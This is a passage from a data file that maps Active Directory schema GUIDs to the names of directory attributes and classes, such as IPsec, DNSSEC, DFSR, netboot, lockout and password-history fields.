""Ipsec-NFA-Reference"",\n    ""ff155a2a-44e5-4de0-8318-13a58988de4f"": ""ms-DS-Is-Domain-For"",\n    ""db0c9089-c1f2-11d1-bbc5-0080c76670c0"": ""msNPCalledStationID"",\n    ""26d9736e-6070-11d1-a9c6-0000f80367c1"": ""Server-Reference-BL"",\n    ""aa12854c-d8fc-4d5e-91ca-368b8d829bee"": ""ms-DNS-Is-Signed"",\n    ""b7b13121-b82e-11d0-afee-0000f80367c1"": ""Ipsec-Policy"",\n    ""7a4117da-cd67-11d0-afff-0000f80367c1"": ""Sites-Container"",\n    ""9a7ad942-ca53-11d1-bbd0-0080c76670c0"": ""Allowed-Child-Classes"",\n    ""b40ff824-427a-11d1-a9c2-0000f80367c1"": ""Ipsec-Owners-Reference"",\n    ""37c94ff6-c6d4-498f-b2f9-c6f7f8647809"": ""ms-DS-Is-Partial-Replica-For"",\n    ""db0c908a-c1f2-11d1-bbc5-0080c76670c0"": ""msNPCallingStationID"",\n    ""bf967a33-0de6-11d0-a285-00aa003049e2"": ""Server-Role"",\n    ""c79f2199-6da1-46ff-923c-1f3f800c721e"": ""ms-DNS-Sign-With-NSEC3"",\n    ""9a7ad943-ca53-11d1-bbd0-0080c76670c0"": ""Allowed-Child-Classes-Effective"",\n    ""b7b13118-b82e-11d0-afee-0000f80367c1"": ""Ipsec-Policy-Reference"",\n    ""fe01245a-341f-4556-951f-48c033a89050"": ""ms-DS-Is-User-Cachable-At-Rodc"",\n    ""db0c908e-c1f2-11d1-bbc5-0080c76670c0"": ""msNPSavedCallingStationID"",\n    ""bf967a34-0de6-11d0-a285-00aa003049e2"": ""Server-State"",\n    ""7bea2088-8ce2-423c-b191-66ec506b1595"": ""ms-DNS-NSEC3-OptOut"",\n    ""bf967a9e-0de6-11d0-a285-00aa003049e2"": ""Leaf"",\n    ""bf967ab5-0de6-11d0-a285-00aa003049e2"": ""Storage"",\n    ""00fbf30c-91fe-11d1-aebc-0000f80367c1"": ""Alt-Security-Identities"",\n    ""00fbf30d-91fe-11d1-aebc-0000f80367c1"": ""Is-Critical-System-Object"",\n    ""cbdad11c-7fec-387b-6219-3a0627d9af81"": ""ms-DS-Revealed-List"",\n    ""db0c909c-c1f2-11d1-bbc5-0080c76670c0"": ""msRADIUSCallbackNumber"",\n    ""b7b1311c-b82e-11d0-afee-0000f80367c1"": ""Service-Binding-Information"",\n    ""0dc063c1-52d9-4456-9e15-9c2434aafd94"": ""ms-DNS-Maintain-Trust-Anchor"",\n    ""45b01500-c419-11d1-bbc9-0080c76670c0"": ""ANR"",\n    ""28630ebe-41d5-11d1-a9c1-0000f80367c1"": ""Is-Defunct"",\n    ""aa1c88fd-b0f6-429f-b2ca-9d902266e808"": ""ms-DS-Revealed-List-BL"",\n    ""db0c90a4-c1f2-11d1-bbc5-0080c76670c0"": ""msRADIUSFramedIPAddress"",\n    ""bf967a35-0de6-11d0-a285-00aa003049e2"": ""Service-Class-ID"",\n    ""5c5b7ad2-20fa-44bb-beb3-34b9c0f65579"": ""ms-DNS-DS-Record-Algorithms"",\n    ""1be8f17d-a9ff-11d0-afe2-00c04fd930c9"": ""Licensing-Site-Settings"",\n    ""b7b13124-b82e-11d0-afee-0000f80367c1"": ""Subnet"",\n    ""96a7dd65-9118-11d1-aebc-0000f80367c1"": ""App-Schema-Version"",\n    ""bf96798f-0de6-11d0-a285-00aa003049e2"": ""Is-Deleted"",\n    ""011929e6-8b5d-4258-b64a-00b0b4949747"": ""ms-DS-Last-Successful-Interactive-Logon-Time"",\n    ""db0c90a9-c1f2-11d1-bbc5-0080c76670c0"": ""msRADIUSFramedRoute"",\n    ""bf967a36-0de6-11d0-a285-00aa003049e2"": ""Service-Class-Info"",\n    ""27d93c40-065a-43c0-bdd8-cdf2c7d120aa"": ""ms-DNS-RFC5011-Key-Rollovers"",\n    ""dd712226-10e4-11d0-a05f-00aa006c33ed"": ""Application-Name"",\n    ""f4c453f0-c5f1-11d1-bbcb-0080c76670c0"": ""Is-Ephemeral"",\n    ""c7e7dafa-10c3-4b8b-9acd-54f11063742e"": ""ms-DS-Last-Failed-Interactive-Logon-Time"",\n    ""db0c90b6-c1f2-11d1-bbc5-0080c76670c0"": ""msRADIUSServiceType"",\n    ""b7b1311d-b82e-11d0-afee-0000f80367c1"": ""Service-Class-Name"",\n    ""ff9e5552-7db7-4138-8888-05ce320a0323"": ""ms-DNS-NSEC3-Hash-Algorithm"",\n    ""ddac0cf5-af8f-11d0-afeb-00c04fd930c9"": ""Link-Track-Object-Move-Table"",\n    ""b7b13125-b82e-11d0-afee-0000f80367c1"": ""Subnet-Container"",\n    ""8297931d-86d3-11d0-afda-00c04fd930c9"": ""Applies-To"",\n    ""bf967991-0de6-11d0-a285-00aa003049e2"": ""Is-Member-Of-DL"",\n    ""dc3ca86f-70ad-4960-8425-a4d6313d93dd"": ""ms-DS-Failed-Interactive-Logon-Count"",\n    ""db0c90c5-c1f2-11d1-bbc5-0080c76670c0"": ""msRASSavedCallbackNumber"",\n    ""28630eb8-41d5-11d1-a9c1-0000f80367c1"": ""Service-DNS-Name"",\n    ""13361665-916c-4de7-a59d-b1ebbd0de129"": ""ms-DNS-NSEC3-Random-Salt-Length"",\n    ""ba305f75-47e3-11d0-a1a6-00c04fd930c9"": ""Asset-Number"",\n    ""19405b9d-3cfa-11d1-a9c0-0000f80367c1"": ""Is-Member-Of-Partial-Attribute-Set"",\n    ""c5d234e5-644a-4403-a665-e26e0aef5e98"": ""ms-DS-Failed-Interactive-Logon-Count-At-Last-Successful-Logon"",\n    ""db0c90c6-c1f2-11d1-bbc5-0080c76670c0"": ""msRASSavedFramedIPAddress"",\n    ""28630eba-41d5-11d1-a9c1-0000f80367c1"": ""Service-DNS-Name-Type"",\n    ""80b70aab-8959-4ec0-8e93-126e76df3aca"": ""ms-DNS-NSEC3-Iterations"",\n    ""ddac0cf7-af8f-11d0-afeb-00c04fd930c9"": ""Link-Track-OMT-Entry"",\n    ""0296c11c-40da-11d1-a9c0-0000f80367c1"": ""Assistant"",\n    ""19405b9c-3cfa-11d1-a9c0-0000f80367c1"": ""Is-Privilege-Holder"",\n    ""31f7b8b6-c9f8-4f2d-a37b-58a823030331"": ""ms-DS-USN-Last-Sync-Success"",\n    ""db0c90c7-c1f2-11d1-bbc5-0080c76670c0"": ""msRASSavedFramedRoute"",\n    ""bf967a37-0de6-11d0-a285-00aa003049e2"": ""Service-Instance-Version"",\n    ""8f4e317f-28d7-442c-a6df-1f491f97b326"": ""ms-DNS-DNSKEY-Record-Set-TTL"",\n    ""bf967ab8-0de6-11d0-a285-00aa003049e2"": ""Trusted-Domain"",\n    ""398f63c0-ca60-11d1-bbd1-0000f81f10c0"": ""Assoc-NT-Account"",\n    ""8fb59256-55f1-444b-aacb-f5b482fe3459"": ""Is-Recycled"",\n    ""78fc5d84-c1dc-3148-8984-58f792d41d3e"": ""ms-DS-Value-Type-Reference"",\n    ""bf9679d3-0de6-11d0-a285-00aa003049e2"": ""Must-Contain"",\n    ""f3a64788-5306-11d1-a9c5-0000f80367c1"": ""Service-Principal-Name"",\n    ""29869b7c-64c4-42fe-97d5-fbc2fa124160"": ""ms-DNS-DS-Record-Set-TTL"",\n    ""ddac0cf6-af8f-11d0-afeb-00c04fd930c9"": ""Link-Track-Vol-Entry"",\n    ""3320fc38-c379-4c17-a510-1bdf6133c5da"": ""associatedDomain"",\n    ""bf967992-0de6-11d0-a285-00aa003049e2"": ""Is-Single-Valued"",\n    ""ab5543ad-23a1-3b45-b937-9b313d5474a8"": ""ms-DS-Value-Type-Reference-BL"",\n    ""80212840-4bdc-11d1-a9c4-0000f80367c1"": ""Name-Service-Flags"",\n    ""7d6c0e97-7e20-11d0-afd6-00c04fd930c9"": ""Setup-Command"",\n    ""03d4c32e-e217-4a61-9699-7bbc4729a026"": ""ms-DNS-Signature-Inception-Offset"",\n    ""281416e2-1968-11d0-a28f-00aa003049e2"": ""Type-Library"",\n    ""f7fbfc45-85ab-42a4-a435-780e62f7858b"": ""associatedName"",\n    ""bac80572-09c4-4fa9-9ae6-7628d7adbe0e"": ""jpegPhoto"",\n    ""8a0560c1-97b9-4811-9db7-dc061598965b"": ""ms-DS-Optional-Feature-Flags"",\n    ""bf9679d6-0de6-11d0-a285-00aa003049e2"": ""NC-Name"",\n    ""553fd039-f32e-11d0-b0bc-00c04fd8dca6"": ""Shell-Context-Menu"",\n    ""f6b0f0be-a8e4-4468-8fd9-c3c47b8722f9"": ""ms-DNS-Secure-Delegation-Polling-Period"",\n    ""ddac0cf4-af8f-11d0-afeb-00c04fd930c9"": ""Link-Track-Volume-Table"",\n    ""fa4693bb-7bc2-4cb9-81a8-c99c43b7905e"": ""attributeCertificateAttribute"",\n    ""bf967993-0de6-11d0-a285-00aa003049e2"": ""Keywords"",\n    ""bf9679d8-0de6-11d0-a285-00aa003049e2"": ""NETBIOS-Name"",\n    ""52458039-ca6a-11d0-afff-0000f80367c1"": ""Shell-Property-Pages"",\n    ""3443d8cd-e5b6-4f3b-b098-659a0214a079"": ""ms-DNS-Signing-Key-Descriptors"",\n    ""bf967abb-0de6-11d0-a285-00aa003049e2"": ""Volume"",\n    ""cb843f80-48d9-11d1-a9c3-0000f80367c1"": ""Attribute-Display-Names"",\n    ""1677581f-47f3-11d1-a9c3-0000f80367c1"": ""Knowledge-Information"",\n    ""07383076-91df-11d1-aebc-0000f80367c1"": ""netboot-Allow-New-Clients"",\n    ""45b01501-c419-11d1-bbc9-0080c76670c0"": ""Short-Server-Name"",\n    ""b7673e6d-cad9-4e9e-b31a-63e8098fdd63"": ""ms-DNS-Signing-Keys"",\n    ""bf967aa0-0de6-11d0-a285-00aa003049e2"": ""Locality"",\n    ""bf967922-0de6-11d0-a285-00aa003049e2"": ""Attribute-ID"",\n    ""c569bb46-c680-44bc-a273-e6c227d71b45"": ""labeledURI"",\n    ""0738307b-91df-11d1-aebc-0000f80367c1"": ""netboot-Answer-Only-Valid-Clients"",\n    ""3e74f60e-3e73-11d1-a9c0-0000f80367c1"": ""Show-In-Address-Book"",\n    ""28c458f5-602d-4ac9-a77c-b3f1be503a7e"": ""ms-DNS-DNSKEY-Records"",\n    ""ad44bb41-67d5-4d88-b575-7b20674e76d8"": ""PosixAccount"",\n    ""bf967924-0de6-11d0-a285-00aa003049e2"": ""Attribute-Security-GUID"",\n    ""1fbb0be8-ba63-11d0-afef-0000f80367c1"": ""Last-Backup-Restoration-Time"",\n    ""0738307a-91df-11d1-aebc-0000f80367c1"": ""netboot-Answer-Requests"",\n    ""bf967984-0de6-11d0-a285-00aa003049e2"": ""Show-In-Advanced-View-Only"",\n    ""285c6964-c11a-499e-96d8-bf7c75a223c6"": ""ms-DNS-Parent-Has-Secure-Delegation"",\n    ""52ab8671-5709-11d1-a9c6-0000f80367c1"": ""Lost-And-Found"",\n    ""bf967925-0de6-11d0-a285-00aa003049e2"": ""Attribute-Syntax"",\n    ""bf967995-0de6-11d0-a285-00aa003049e2"": ""Last-Content-Indexed"",\n    ""5643ff81-35b6-4ca9-9512-baf0bd0a2772"": ""ms-FRS-Hub-Member"",\n    ""07383079-91df-11d1-aebc-0000f80367c1"": ""netboot-Current-Client-Count"",\n    ""17eb4278-d167-11d0-b002-0000f80367c1"": ""SID-History"",\n    ""ba340d47-2181-4ca0-a2f6-fae4479dab2a"": ""ms-DNS-Propagation-Time"",\n    ""5b6d8467-1a18-4174-b350-9cc6e7b4ac8d"": ""ShadowAccount"",\n    ""9a7ad944-ca53-11d1-bbd0-0080c76670c0"": ""Attribute-Types"",\n    ""52ab8670-5709-11d1-a9c6-0000f80367c1"": ""Last-Known-Parent"",\n    ""92aa27e0-5c50-402d-9ec1-ee847def9788"": ""ms-FRS-Topology-Pref"",\n    ""3e978921-8c01-11d0-afda-00c04fd930c9"": ""Netboot-GUID"",\n    ""2a39c5b2-8960-11d1-aebc-0000f80367c1"": ""Signature-Algorithms"",\n    ""aff16770-9622-4fbc-a128-3088777605b9"": ""ms-DNS-NSEC3-User-Salt"",\n    ""11b6cc94-48c4-11d1-a9c3-0000f80367c1"": ""Meeting"",\n    ""d0e1d224-e1a0-42ce-a2da-793ba5244f35"": ""audio"",\n    ""bf967996-0de6-11d0-a285-00aa003049e2"": ""Last-Logoff"",\n    ""1a861408-38c3-49ea-ba75-85481a77c655"": ""ms-DFSR-Version"",\n    ""532570bd-3d77-424f-822f-0d636dc6daad"": ""Netboot-DUID"",\n    ""3e978924-8c01-11d0-afda-00c04fd930c9"": ""Site-GUID"",\n    ""387d9432-a6d1-4474-82cd-0a89aae084ae"": ""ms-DNS-NSEC3-Current-Salt"",\n    ""2a9350b8-062c-4ed0-9903-dde10d06deba"": ""PosixGroup"",\n    ""6da8a4fe-0e52-11d0-a286-00aa003049e2"": ""Auditing-Policy"",\n    ""bf967997-0de6-11d0-a285-00aa003049e2"": ""Last-Logon"",\n    ""78f011ec-a766-4b19-adcf-7b81ed781a4d"": ""ms-DFSR-Extension"",\n    ""3e978920-8c01-11d0-afda-00c04fd930c9"": ""Netboot-Initialization"",\n    ""d50c2cdd-8951-11d1-aebc-0000f80367c1"": ""Site-Link-List"",\n    ""07831919-8f94-4fb6-8a42-91545dccdad3"": ""ms-Authz-Effective-Security-Policy"",\n    ""c9010e74-4e58-49f7-8a89-5e3e2340fcf8"": ""ms-COM-Partition"",\n    ""bf967928-0de6-11d0-a285-00aa003049e2"": ""Authentication-Options"",\n    ""c0e20a04-0e5a-4ff3-9482-5efeaecd7060"": ""Last-Logon-Timestamp"",\n    ""d7d5e8c1-e61f-464f-9fcf-20bbe0a2ec54"": ""ms-DFSR-RootPath"",\n    ""0738307e-91df-11d1-aebc-0000f80367c1"": ""netboot-IntelliMirror-OSes"",\n    ""d50c2cdc-8951-11d1-aebc-0000f80367c1"": ""Site-List"",\n    ""b946bece-09b5-4b6a-b25a-4b63a330e80e"": ""ms-Authz-Proposed-Security-Policy"",\n    ""2517fadf-fa97-48ad-9de6-79ac5721f864"": ""IpService"",\n    ""1677578d-47f3-11d1-a9c3-0000f80367c1"": ""Authority-Revocation-List"",\n    ""bf967998-0de6-11d0-a285-00aa003049e2"": ""Last-Set-Time"",\n    ""90b769ac-4413-43cf-ad7a-867142e740a3"": ""ms-DFSR-RootSizeInMb"",\n    ""07383077-91df-11d1-aebc-0000f80367c1"": ""netboot-Limit-Clients"",\n    ""3e10944c-c354-11d0-aff8-0000f80367c1"": ""Site-Object"",\n    ""8e1685c6-3e2f-48a2-a58d-5af0ea789fa0"": ""ms-Authz-Last-Effective-Security-Policy"",\n    ""250464ab-c417-497a-975a-9e0d459a7ca1"": ""ms-COM-PartitionSet"",\n    ""bf96792c-0de6-11d0-a285-00aa003049e2"": ""Auxiliary-Class"",\n    ""7d6c0e9c-7e20-11d0-afd6-00c04fd930c9"": ""Last-Update-Sequence"",\n    ""86b9a69e-f0a6-405d-99bb-77d977992c2a"": ""ms-DFSR-StagingPath"",\n    ""07383080-91df-11d1-aebc-0000f80367c1"": ""netboot-Locally-Installed-OSes"",\n    ""3e10944d-c354-11d0-aff8-0000f80367c1"": ""Site-Object-BL"",\n    ""80997877-f874-4c68-864d-6e508a83bdbd"": ""ms-Authz-Resource-Condition"",\n    ""9c2dcbd2-fbf0-4dc7-ace0-8356dcd0f013"": ""IpProtocol"",\n    ""bf96792d-0de6-11d0-a285-00aa003049e2"": ""Bad-Password-Time"",\n    ""7359a352-90f7-11d1-aebc-0000f80367c1"": ""LDAP-Admin-Limits"",\n    ""250a8f20-f6fc-4559-ae65-e4b24c67aebe"": ""ms-DFSR-StagingSizeInMb"",\n    ""3e978923-8c01-11d0-afda-00c04fd930c9"": ""Netboot-Machine-File-Path"",\n    ""1be8f17c-a9ff-11d0-afe2-00c04fd930c9"": ""Site-Server"",\n    ""62f29b60-be74-4630-9456-2f6691993a86"": ""ms-Authz-Central-Access-Policy-ID"",\n    ""90df3c3e-1854-4455-a5d7-cad40d56657a"": ""ms-DS-App-Configuration"",\n    ""bf96792e-0de6-11d0-a285-00aa003049e2"": ""Bad-Pwd-Count"",\n    ""bf96799a-0de6-11d0-a285-00aa003049e2"": ""LDAP-Display-Name"",\n    ""5cf0bcc8-60f7-4bff-bda6-aea0344eb151"": ""ms-DFSR-ConflictPath"",\n    ""07383078-91df-11d1-aebc-0000f80367c1"": ""netboot-Max-Clients"",\n    ""26d9736f-6070-11d1-a9c6-0000f80367c1"": ""SMTP-Mail-Address"",\n    ""57f22f7a-377e-42c3-9872-cec6f21d2e3e"": ""ms-Authz-Member-Rules-In-Central-Access-Policy"",\n    ""cadd1e5e-fefc-4f3f-b5a9-70e994204303"": ""OncRpc"",\n    ""1f0075f9-7e40-11d0-afd6-00c04fd930c9"": ""Birth-Location"",\n    ""7359a353-90f7-11d1-aebc-0000f80367c1"": ""LDAP-IPDeny-List"",\n    ""9ad33fc9-aacf-4299-bb3e-d1fc6ea88e49"": ""ms-DFSR-ConflictSizeInMb"",\n    ""2df90d85-009f-11d2-aa4c-00c04fd7d83a"": ""Netboot-Mirror-Data-File"",\n    ""2ab0e76c-7041-11d2-9905-0000f87a57d4"": ""SPN-Mappings"",\n    ""516e67cf-fedd-4494-bb3a-bc506a948891"": ""ms-Authz-Member-Rules-In-Central-Access-Policy-BL"",\n    ""9e67d761-e327-4d55-bc95-682f875e2f8e"": ""ms-DS-App-Data"",\n    ""d50c2cdb-8951-11d1-aebc-0000f80367c1"": ""Bridgehead-Server-List-BL"",\n    ""03726ae7-8e7d-4446-8aae-a91657c00993"": ""ms-DFSR-Enabled"",\n    ""0738307c-91df-11d1-aebc-0000f80367c1"": ""netboot-New-Machine-Naming-Policy"",\n    ""bf967a39-0de6-11d0-a285-00aa003049e2"": ""State-Or-Province-Name"",\n    ""fa32f2a6-f28b-47d0-bf91-663e8f910a72"": ""ms-DS-Claim-Source"",\n    ""ab911646-8827-4f95-8780-5a8f008eb68f"": ""IpHost"",\n    ""d50c2cda-8951-11d1-aebc-0000f80367c1"": ""Bridgehead-Transport-List"",\n    ""bf96799b-0de6-11d0-a285-00aa003049e2"": ""Link-ID"",\n    ""eeed0fc8-1001-45ed-80cc-bbf744930720"": ""ms-DFSR-ReplicationGroupType"",\n    ""0738307d-91df-11d1-aebc-0000f80367c1"": ""netboot-New-Machine-OU"",\n    ""bf967a3a-0de6-11d0-a285-00aa003049e2"": ""Street-Address"",\n    ""92f19c05-8dfa-4222-bbd1-2c4f01487754"": ""ms-DS-Claim-Source-Type"",\n    ""cfee1051-5f28-4bae-a863-5d0cc18a8ed1"": ""ms-DS-Az-Admin-Manager"",\n    ""f87fa54b-b2c5-4fd7-88c0-daccb21d93c5"": ""buildingName"",\n    ""2ae80fe2-47b4-11d0-a1a4-00c04fd930c9"": ""Link-Track-Secret"",\n    ""23e35d4c-e324-4861-a22f-e199140dae00"": ""ms-DFSR-TombstoneExpiryInMin"",\n    ""07383082-91df-11d1-aebc-0000f80367c1"": ""netboot-SCP-BL"",\n    ""3860949f-f6a8-4b38-9950-81ecb6bc2982"": ""Structural-Object-Class"",\n    ""0c2ce4c7-f1c3-4482-8578-c60d4bb74422"": ""ms-DS-Claim-Is-Value-Space-Restricted"",\n    ""d95836c3-143e-43fb-992a-b057f1ecadf9"": ""IpNetwork"",\n    ""bf96792f-0de6-11d0-a285-00aa003049e2"": ""Builtin-Creation-Time"",\n    ""bf96799d-0de6-11d0-a285-00aa003049e2"": ""Lm-Pwd-History"",\n    ""d68270ac-a5dc-4841-a6ac-cd68be38c181"": ""ms-DFSR-FileFilter"",\n    ""07383081-91df-11d1-aebc-0000f80367c1"": ""netboot-Server"",\n    ""bf967a3b-0de6-11d0-a285-00aa003049e2"": ""Sub-Class-Of"",\n    ""cd789fb9-96b4-4648-8219-ca378161af38"": ""ms-DS-Claim-Is-Single-Valued"",\n    ""ddf8de9b-cba5-4e12-842e-28d8b66f75ec"": ""ms-DS-Az-Application"",\n    ""bf967930-0de6-11d0-a285-00aa003049e2"": ""Builtin-Modified-Count"",\n    ""bf96799e-0de6-11d0-a285-00aa003049e2"": ""Local-Policy-Flags"",\n    ""93c7b477-1f2e-4b40-b7bf-007e8d038ccf"": ""ms-DFSR-DirectoryFilter"",\n    ""2df90d84-009f-11d2-aa4c-00c04fd7d83a"": ""Netboot-SIF-File"",\n    ""bf967a3c-0de6-11d0-a285-00aa003049e2"": ""Sub-Refs"",\n    ""1e5d393d-8cb7-4b4f-840a-973b36cc09c3"": ""ms-DS-Generation-Id"",\n    ""72efbf84-6e7b-4a5c-a8db-8a75a7cad254"": ""NisNetgroup"",\n    ""bf967931-0de6-11d0-a285-00aa003049e2"": ""Business-Category"",\n    ""80a67e4d-9f22-11d0-afdd-00c04fd930c9"": ""Local-Policy-Reference"",\n    ""4699f15f-a71f-48e2-9ff5-5897c0759205"": ""ms-DFSR-Schedule"",\n    ""0738307f-91df-11d1-aebc-0000f80367c1"": ""netboot-Tools"",\n    ""9a7ad94d-ca53-11d1-bbd0-0080c76670c0"": ""SubSchemaSubEntry"",\n    ""a13df4e2-dbb0-4ceb-828b-8b2e143e9e81"": ""ms-DS-Primary-Computer"",\n    ""860abe37-9a9b-4fa4-b3d2-b8ace5df9ec5"": ""ms-DS-Az-Operation"",\n    ""ba305f76-47e3-11d0-a1a6-00c04fd930c9"": ""Bytes-Per-Minute"",\n    ""bf9679a1-0de6-11d0-a285-00aa003049e2"": ""Locale-ID"",\n    ""048b4692-6227-4b67-a074-c4437083e14b"": ""ms-DFSR-Keywords"",\n    ""bf9679d9-0de6-11d0-a285-00aa003049e2"": ""Network-Address"",\n    ""963d274c-48be-11d1-a9c3-0000f80367c1"": ""Super-Scope-Description"",\n    ""998c06ac-3f87-444e-a5df-11b03dc8a50c"": ""ms-DS-Is-Primary-Computer-For"",\n    ""7672666c-02c1-4f33-9ecf-f649c1dd9b7c"": ""NisMap"",\n    ""bf967932-0de6-11d0-a285-00aa003049e2"": ""CA-Certificate"",\n    ""bf9679a2-0de6-11d0-a285-00aa003049e2"": ""Locality-Name"",\n    ""fe515695-3f61-45c8-9bfa-19c148c57b09"": ""ms-DFSR-Flags"",\n    ""bf9679da-0de6-11d0-a285-00aa003049e2"": ""Next-Level-Store"",\n    ""963d274b-48be-11d1-a9c3-0000f80367c1"": ""Super-Scopes"",\n    ""db2c48b2-d14d-ec4e-9f58-ad579d8b440e"": ""ms-Kds-KDF-AlgorithmID"",\n    ""8213eac9-9d55-44dc-925c-e9a52b927644"": ""ms-DS-Az-Role"",\n    ""963d2740-48be-11d1-a9c3-0000f80367c1"": ""CA-Certificate-DN"",\n    ""d9e18316-8939-11d1-aebc-0000f80367c1"": ""Localized-Description"",\n    ""d6d67084-c720-417d-8647-b696237a114c"": ""ms-DFSR-Options"",\n    ""bf9679db-0de6-11d0-a285-00aa003049e2"": ""Next-Rid"",\n    ""5245801d-ca6a-11d0-afff-0000f80367c1"": ""Superior-DNS-Root"",\n    ""8a800772-f4b8-154f-b41c-2e4271eff7a7"": ""ms-Kds-KDF-Param"",\n    ""904f8a93-4954-4c5f-b1e1-53c097a31e13"": ""NisObject"",\n    ""963d2735-48be-11d1-a9c3-0000f80367c1"": ""CA-Connect"",\n    ""a746f0d1-78d0-11d2-9916-0000f87a57d4"": ""Localization-Display-Id"",\n    ""1035a8e1-67a8-4c21-b7bb-031cdf99d7a0"": ""ms-DFSR-ContentSetGuid"",\n    ""52458018-ca6a-11d0-afff-0000f80367c1"": ""Non-Security-Member"",\n    ""bf967a3f-0de6-11d0-a285-00aa003049e2"": ""Supplemental-Credentials"",\n    ""1702975d-225e-cb4a-b15d-0daea8b5e990"": ""ms-Kds-SecretAgreement-AlgorithmID"",\n    ""4feae054-ce55-47bb-860e-5b12063a51de"": ""ms-DS-Az-Scope"",\n    ""963d2738-48be-11d1-a9c3-0000f80367c1"": ""CA-Usages"",\n    ""09dcb79f-165f-11d0-a064-00aa006c33ed"": ""Location"",\n    ""e3b44e05-f4a7-4078-a730-f48670a743f8"": ""ms-DFSR-RdcEnabled"",\n    ""52458019-ca6a-11d0-afff-0000f80367c1"": ""Non-Security-Member-BL"",\n    ""1677588f-47f3-11d1-a9c3-0000f80367c1"": ""Supported-Application-Context"",\n    ""30b099d9-edfe-7549-b807-eba444da79e9"": ""ms-Kds-SecretAgreement-Param"",\n    ""a699e529-a637-4b7d-a0fb-5dc466a0b8a7"": ""IEEE802Device"",\n    ""963d2736-48be-11d1-a9c3-0000f80367c1"": ""CA-WEB-URL"",\n    ""bf9679a4-0de6-11d0-a285-00aa003049e2"": ""Lock-Out-Observation-Window"",\n    ""f402a330-ace5-4dc1-8cc9-74d900bf8ae0"": ""ms-DFSR-RdcMinFileSizeInKb"",\n    ""19195a56-6da0-11d0-afd3-00c04fd930c9"": ""Notification-List"",\n    ""bf967a41-0de6-11d0-a285-00aa003049e2"": ""Surname"",\n    ""e338f470-39cd-4549-ab5b-f69f9e583fe0"": ""ms-Kds-PublicKey-Length"",\n    ""1ed3a473-9b1b-418a-bfa0-3a37b95a5306"": ""ms-DS-Az-Task"",\n    ""d9e18314-8939-11d1-aebc-0000f80367c1"": ""Can-Upgrade-Script"",\n    ""bf9679a5-0de6-11d0-a285-00aa003049e2"": ""Lockout-Duration"",\n    ""2cc903e2-398c-443b-ac86-ff6b01eac7ba"": ""ms-DFSR-DfsPath"",\n    ""bf9679df-0de6-11d0-a285-00aa003049e2"": ""NT-Group-Members"",\n    ""037651e4-441d-11d1-a9c3-0000f80367c1"": ""Sync-Attributes"",\n    ""615f42a1-37e7-1148-a0dd-3007e09cfc81"": ""ms-Kds-PrivateKey-Length"",\n    ""4bcb2477-4bb3-4545-a9fc-fb66e136b435"": ""BootableDevice"",\n    ""9a7ad945-ca53-11d1-bbd0-0080c76670c0"": ""Canonical-Name"",\n    ""bf9679a6-0de6-11d0-a285-00aa003049e2"": ""Lockout-Threshold"",\n    ""51928e94-2cd8-4abe-b552-e50412444370"": ""ms-DFSR-RootFence"",\n    ""3e97891f-8c01-11d0-afda-00c04fd930c9"": ""NT-Mixed-Domain"",\n    ""037651e3-441d-11d1-a9c3-0000f80367c1"": ""Sync-Membership"",\n    ""26627c27-08a2-0a40-a1b1-8dce85b42993"": ""ms-Kds-RootKeyData"",\n    ""44f00041-35af-468b-b20a-6ce8737c580b"": ""ms-DS-Optional-Feature"",\n    ""d4159c92-957d-4a87-8a67-8d2934e01649"": ""carLicense"",\n    ""28630ebf-41d5-11d1-a9c1-0000f80367c1"": ""Lockout-Time"",\n    ""2dad8796-7619-4ff8-966e-0a5cc67b287f"": ""ms-DFSR-ReplicationGroupGuid"",\n    ""bf9679e2-0de6-11d0-a285-00aa003049e2"": ""Nt-Pwd-History"",\n    ""037651e2-441d-11d1-a9c3-0000f80367c1"": ""Sync-With-Object"",\n    ""d5f07340-e6b0-1e4a-97be-0d3318bd9db1"": ""ms-Kds-Version"",\n    ""d6710785-86ff-44b7-85b5-f1f8689522ce"": ""msSFU-30-Mail-Aliases"",\n    ""7bfdcb81-4807-11d1-a9c3-0000f80367c1"": ""Catalogs"",\n    ""bf9679a9-0de6-11d0-a285-00aa003049e2"": ""Logo"",\n    ""f7b85ba9-3bf9-428f-aab4-2eee6d56f063"": ""ms-DFSR-DfsLinkTarget"",\n    ""bf9679e3-0de6-11d0-a285-00aa003049e2"": ""NT-Security-Descriptor"",\n    ""037651e5-441d-11d1-a9c3-0000f80367c1"": ""Sync-With-SID"",\n    ""96400482-cf07-e94c-90e8-f2efc4f0495e"": ""ms-Kds-DomainID"",\n    ""3bcd9db8-f84b-451c-952f-6c52b81f9ec6"": ""ms-DS-Password-Settings"",\n    ""7bfdcb7e-4807-11d1-a9c3-0000f80367c1"": ""Categories"",\n    ""bf9679aa-0de6-11d0-a285-00aa003049e2"": ""Logon-Count"",\n    ""261337aa-f1c3-44b2-bbea-c88d49e6f0c7"": ""ms-DFSR-MemberReference"",\n    ""bf9679e4-0de6-11d0-a285-00aa003049e2"": ""Obj-Dist-Name"",\n    ""bf967a43-0de6-11d0-a285-00aa003049e2"": ""System-Auxiliary-Class"",\n    ""6cdc047f-f522-b74a-9a9c-d95ac8cdfda2"": ""ms-Kds-UseStartTime"",\n    ""e263192c-2a02-48df-9792-94f2328781a0"": ""msSFU-30-Net-Id"",\n    ""7d6c0e94-7e20-11d0-afd6-00c04fd930c9"": ""Category-Id"",\n    ""bf9679ab-0de6-11d0-a285-00aa003049e2"": ""Logon-Hours"",\n    ""6c7b5785-3d21-41bf-8a8a-627941544d5a"": ""ms-DFSR-ComputerReference"",\n    ""26d97369-6070-11d1-a9c6-0000f80367c1"": ""Object-Category"",\n    ""e0fa1e62-9b45-11d0-afdd-00c04fd930c9"": ""System-Flags"",\n    ""ae18119f-6390-0045-b32d-97dbc701aef7"": ""ms-Kds-CreateTime"",\n    ""5b06b06a-4cf3-44c0-bd16-43bc10a987da"": ""ms-DS-Password-Settings-Container"",\n    ""963d2732-48be-11d1-a9c3-0000f80367c1"": ""Certificate-Authority-Object"",\n    ""bf9679ac-0de6-11d0-a285-00aa003049e2"": ""Logon-Workstation"",\n    ""adde62c6-1880-41ed-bd3c-30b7d25e14f0"": ""ms-DFSR-MemberReferenceBL"",\n    ""bf9679e5-0de6-11d0-a285-00aa003049e2"": ""Object-Class"",\n    ""bf967a44-0de6-11d0-a285-00aa003049e2"": ""System-May-Contain"",\n    ""9cdfdbc5-0304-4569-95f6-c4f663fe5ae6"": ""ms-Imaging-Thumbprint-Hash"",\n    ""36297dce-656b-4423-ab65-dabb2770819e"": ""msSFU-30-Domain-Info"",\n    ""1677579f-47f3-11d1-a9c3-0000f80367c1"": ""Certificate-Revocation-List"",\n    ""bf9679ad-0de6-11d0-a285-00aa003049e2"": 